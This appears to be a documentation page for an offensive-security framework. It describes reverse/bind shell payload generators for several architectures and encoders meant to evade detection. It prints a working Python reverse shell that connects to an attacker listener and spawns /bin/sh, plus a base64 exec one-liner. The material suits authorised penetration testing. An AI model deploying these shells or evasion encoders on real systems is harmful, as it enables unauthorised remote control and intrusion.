# Payloads and encoders

**Language:** English (en-US). **pt-BR:** [../pt-BR/09-payloads-e-encoders.md](../pt-BR/09-payloads-e-encoders.md)

---

## Payloads — `payloads/*`

Generate shellcode or interpreter one-liners for reverse/bind shells. Available
architectures: `armle`, `mipsbe`, `mipsle`, `x86`, `x64`, and `cmd/` interpreters.

### Architecture families

| Path prefix | Architecture / type |
|-------------|---------------------|
| `payloads/x86/` | 32-bit x86 shellcode |
| `payloads/x64/` | 64-bit x86-64 shellcode |
| `payloads/armle/` | ARM little-endian shellcode |
| `payloads/mipsbe/` | MIPS big-endian shellcode |
| `payloads/mipsle/` | MIPS little-endian shellcode |
| `payloads/python/` | Python one-liners |
| `payloads/php/` | PHP one-liners |
| `payloads/perl/` | Perl one-liners |
| `payloads/cmd/` | Bash / netcat / PowerShell commands |

### Common payload options

| Option | Type | Default | Description |
|--------|------|---------|-------------|
| `lhost` | `OptIP` | `""` | Attacker listener IP address |
| `lport` | `OptPort` | `4444` | Attacker listener port (integer 1–65535) |
| `badchars` | `OptString` | `""` | Bytes to avoid in shellcode (hex, e.g. `\x00\x0a`) |
| `format` | `OptString` | `"raw"` | Output format: `raw`, `c`, `python`, `hex` |

### Usage example — Python reverse TCP

```text
fxf > use payloads/python/reverse_tcp
fxf (Python Reverse TCP) > set lhost 192.168.56.1
fxf (Python Reverse TCP) > set lport 4444
fxf (Python Reverse TCP) > run
```

**Sample output:**
```
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.56.1",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```

> **Note:** Treat output as sensitive. AV/EDR solutions may flag generated payloads.

---

## Encoders — `encoders/<language>/*`

Transform shellcode or strings to evade detection filters. Available languages:
`python`, `php`, `perl`.

### Available encoders

| Path | Language | Encoding |
|------|----------|---------|
| `encoders/python/base64` | Python | Base64 |
| `encoders/python/hex` | Python | Hexadecimal |
| `encoders/python/rot13` | Python | ROT-13 |
| `encoders/python/url` | Python | URL percent-encoding |
| `encoders/python/base32` | Python | Base32 |
| `encoders/php/base64` | PHP | Base64 |
| `encoders/php/hex` | PHP | Hexadecimal |
| `encoders/php/rot13` | PHP | ROT-13 |
| `encoders/perl/base64` | Perl | Base64 |
| `encoders/perl/hex` | Perl | Hexadecimal |

### Encoder options

| Option | Type | Default | Description |
|--------|------|---------|-------------|
| `data` | `OptString` | `""` | Input string or shellcode to encode |
| `iterations` | `OptInteger` | `1` | Number of encoding iterations |

### Usage example

```text
fxf > use encoders/python/base64
fxf (Python Base64 Encoder) > set data "import os; os.system('id')"
fxf (Python Base64 Encoder) > run
```

**Sample output:**
```
aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyk=

# Decode with:
python3 -c "import base64; exec(base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyk='))"
```

---

[Wiki hub](../README.md)
